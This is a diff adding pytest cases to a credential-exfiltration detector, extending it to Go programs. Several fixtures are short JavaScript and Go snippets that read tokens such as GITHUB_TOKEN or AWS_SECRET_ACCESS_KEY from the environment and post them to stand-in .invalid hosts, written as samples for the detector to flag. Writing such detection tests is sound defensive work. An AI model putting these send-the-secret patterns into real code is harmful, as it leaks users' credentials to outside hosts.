@@ -12,10 +12,11 @@ import pytest
 
 from cordon_scanner import Scanner
 from cordon_scanner.analysis.shared.credential_homes import SecretFlow
-from cordon_scanner.detect.code.secretflow import JavaScriptFlow
+from cordon_scanner.detect.code.secretflow import GoFlow, JavaScriptFlow
 from cordon_scanner.foundation.config.settings import Config
 
 RULE = "SUSPECT.EXFIL.NAMED_SECRET.001"
+GO_HEAD = 'package main\n\nimport (\n\t"net/http"\n\t"os"\n\t"strings"\n)\n\n'
 
 
 class FlowHelpers:
@@ -175,6 +176,28 @@ class TestJavaScript:
         body = "fetch(process.env.API_URL, {headers: {t: process.env.GITHUB_TOKEN}});\n"
         assert not FlowHelpers.fired(tmp_path, "client.js", body)
 
+    def test_another_url_in_a_header_is_not_the_destination(self, tmp_path) -> None:
+        body = (
+            "const t = process.env.GITHUB_TOKEN;\n"
+            'fetch("https://api.github.com/user", {headers: {authorization: `Bearer ${t}`, referer: "https://app.example.invalid"}});\n'
+        )
+        assert not FlowHelpers.fired(tmp_path, "client.js", body)
+
+    def test_a_url_in_a_name_used_for_a_header_is_not_the_destination(self, tmp_path) -> None:
+        body = (
+            "const t = process.env.NPM_TOKEN;\n"
+            'const site = "https://app.example.invalid";\n'
+            'fetch("https://registry.npmjs.org/-/whoami", {headers: {authorization: `Bearer ${t}`, origin: site}});\n'
+        )
+        assert not FlowHelpers.fired(tmp_path, "client.js", body)
+
+    def test_the_url_in_an_options_object_is_the_destination(self, tmp_path) -> None:
+        body = (
+            "const t = process.env.GITHUB_TOKEN;\n"
+            'axios({url: "https://c.example.invalid/p", headers: {authorization: `Bearer ${t}`}});\n'
+        )
+        assert FlowHelpers.fired(tmp_path, "client.js", body)
+
     def test_the_flow_reports_offset_name_and_host(self) -> None:
         text = (
             'const t = process.env.GITHUB_TOKEN;\nfetch("https://cdn.example.invalid/p?x=" + t);\n'
@@ -182,3 +205,147 @@ class TestJavaScript:
         [(offset, name, host)] = JavaScriptFlow.findings(text)
         assert text[offset:].startswith("fetch") and name == "GITHUB_TOKEN"
         assert host == "cdn.example.invalid"
+
+
+# The same claim in Go (`GoFlow`): a program that read a named credential from the environment and
+# put it in a request to another host was read by nobody. Reserved `.invalid` hosts only.
+
+
+class TestAGoProgramSendingANamedCredentialElsewhere:
+    def test_a_bound_token_in_a_request_body(self, tmp_path) -> None:
+        body = GO_HEAD + (
+            "func report() {\n"
+            '\ttoken := os.Getenv("GITHUB_TOKEN")\n'
+            '\treq, _ := http.NewRequest("POST", "https://c.example.invalid/v1", strings.NewReader(token))\n'
+            "\thttp.DefaultClient.Do(req)\n"
+            "}\n"
+        )
+        assert FlowHelpers.fired(tmp_path, "main.go", body)
+
+    def test_a_token_set_as_a_header_after_the_request_is_made(self, tmp_path) -> None:
+        body = GO_HEAD + (
+            "func report() {\n"
+            '\ttoken := os.Getenv("NPM_TOKEN")\n'
+            '\treq, _ := http.NewRequest("GET", "https://c.example.invalid/v1", nil)\n'
+            '\treq.Header.Set("X-Token", token)\n'
+            "\thttp.DefaultClient.Do(req)\n"
+            "}\n"
+        )
+        assert FlowHelpers.fired(tmp_path, "main.go", body)
+
+    def test_a_token_handed_to_a_helper_that_sends_it(self, tmp_path) -> None:
+        body = GO_HEAD + (
+            "func send(k string) {\n"
+            '\thttp.Post("https://c.example.invalid/v1", "text/plain", strings.NewReader(k))\n'
+            "}\n\n"
+            "func main() {\n"
+            '\tkey := os.Getenv("AWS_SECRET_ACCESS_KEY")\n'
+            "\tsend(key)\n"
+            "}\n"
+        )
+        assert FlowHelpers.fired(tmp_path, "cmd/main.go", body)
+
+    def test_the_getenv_made_inline_in_the_call(self, tmp_path) -> None:
+        body = GO_HEAD + (
+            "func send(k string) {\n"
+            '\thttp.Post("https://c.example.invalid/v1", "text/plain", strings.NewReader(k))\n'
+            "}\n\n"
+            "func main() {\n"
+            '\tsend(os.Getenv("GITLAB_TOKEN"))\n'
+            "}\n"
+        )
+        assert FlowHelpers.fired(tmp_path, "main.go", body)
+
+    def test_a_url_bound_to_a_name(self, tmp_path) -> None:
+        body = GO_HEAD + (
+            'const collector = "https://c.example.invalid/v1"\n\n'
+            "func report() {\n"
+            '\ttoken := os.Getenv("SLACK_BOT_TOKEN")\n'
+            '\thttp.Post(collector, "text/plain", strings.NewReader(token))\n'
+            "}\n"
+        )
+        assert FlowHelpers.fired(tmp_path, "main.go", body)
+
+    def test_the_flow_reports_offset_name_and_host(self) -> None:
+        text = GO_HEAD + (
+            "func report() {\n"
+            '\ttoken := os.Getenv("GITHUB_TOKEN")\n'
+            '\thttp.Post("https://c.example.invalid/v1", "text/plain", strings.NewReader(token))\n'
+            "}\n"
+        )
+        [(offset, name, host)] = GoFlow.findings(text)
+        assert text[offset:].startswith("http.Post") and name == "GITHUB_TOKEN"
+        assert host == "c.example.invalid"
+
+
+class TestWhatIsNotAGoClaim:
+    def test_the_token_sent_to_its_own_service(self, tmp_path) -> None:
+        body = GO_HEAD + (
+            "func whoami() {\n"
+            '\ttoken := os.Getenv("GITHUB_TOKEN")\n'
+            '\treq, _ := http.NewRequest("GET", "https://api.github.com/user", nil)\n'
+            '\treq.Header.Set("Authorization", "Bearer "+token)\n'
+            "\thttp.DefaultClient.Do(req)\n"
+            "}\n"
+        )
+        assert not FlowHelpers.fired(tmp_path, "main.go", body)
+
+    def test_a_setting_that_is_not_a_credential(self, tmp_path) -> None:
+        body = GO_HEAD + (
+            "func report() {\n"
+            '\tport := os.Getenv("PORT")\n'
+            '\thttp.Post("https://c.example.invalid/v1", "text/plain", strings.NewReader(port))\n'
+            "}\n"
+        )
+        assert not FlowHelpers.fired(tmp_path, "main.go", body)
+
+    def test_no_literal_host_no_claim(self, tmp_path) -> None:
+        body = GO_HEAD + (
+            "func report() {\n"
+            '\ttoken := os.Getenv("GITHUB_TOKEN")\n'
+            '\thttp.Post(os.Getenv("COLLECTOR_URL"), "text/plain", strings.NewReader(token))\n'
+            "}\n"
+        )
+        assert not FlowHelpers.fired(tmp_path, "main.go", body)
+
+    def test_a_key_that_has_no_home_we_can_know(self, tmp_path) -> None:
+        body = GO_HEAD + (
+            "func report() {\n"
+            '\tkey := os.Getenv("MY_SERVICE_API_KEY")\n'
+            '\thttp.Post("https://c.example.invalid/v1", "text/plain", strings.NewReader(key))\n'
+            "}\n"
+        )
+        assert not FlowHelpers.fired(tmp_path, "main.go", body)
+
+    def test_the_function_that_also_calls_the_keys_service_makes_no_claim(self, tmp_path) -> None:
+        body = GO_HEAD + (
+            "func sync() {\n"
+            '\ttoken := os.Getenv("GITHUB_TOKEN")\n'
+            '\treq, _ := http.NewRequest("GET", "https://api.github.com/user", nil)\n'
+            '\treq.Header.Set("Authorization", "Bearer "+token)\n'
+            "\thttp.DefaultClient.Do(req)\n"
+            '\thttp.Post("https://stats.example.invalid/v1", "text/plain", strings.NewReader("done"))\n'
+            "}\n"
+        )
+        assert not FlowHelpers.fired(tmp_path, "main.go", body)
+
+    def test_a_credential_read_in_another_function_than_the_send(self, tmp_path) -> None:
+        body = GO_HEAD + (
+            "func load() string {\n"
+            '\treturn os.Getenv("GITHUB_TOKEN")\n'
+            "}\n\n"
+            "func ping() {\n"
+            '\thttp.Post("https://c.example.invalid/v1", "text/plain", strings.NewReader("up"))\n'
+            "}\n"
+        )
+        assert not FlowHelpers.fired(tmp_path, "main.go", body)
+
+    @pytest.mark.parametrize("name", ["main_test.go"])
+    def test_a_test_file(self, tmp_path, name) -> None:
+        body = GO_HEAD + (
+            "func report() {\n"
+            '\ttoken := os.Getenv("GITHUB_TOKEN")\n'
+            '\thttp.Post("https://c.example.invalid/v1", "text/plain", strings.NewReader(token))\n'
+            "}\n"
+        )
+        assert not FlowHelpers.fired(tmp_path, name, body)
